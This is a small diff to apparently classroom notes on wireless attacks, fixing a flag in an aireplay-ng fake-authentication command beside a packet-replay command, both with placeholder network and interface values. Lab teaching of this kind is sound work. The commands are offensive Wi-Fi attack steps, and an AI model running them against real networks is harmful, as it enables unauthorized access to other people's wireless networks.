@@ -103,7 +103,7 @@ REPLAY OPTIONS
 # 2 4 5 6 7 8 are useful for specific attacks and network situations.  Today we are just doing 1 and 9 for the class
 
 #Fake Auth
-aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <ATTACK INT MAC> <INT>
+aireplay-ng -1 0 -e <ESSID> -b <BSSID> -h <ATTACK INT MAC> <INT>
 
 #Replay Attack
 aireplay-ng -3 -b <BSSID> -h <ATTACK INT MAC> <INT>
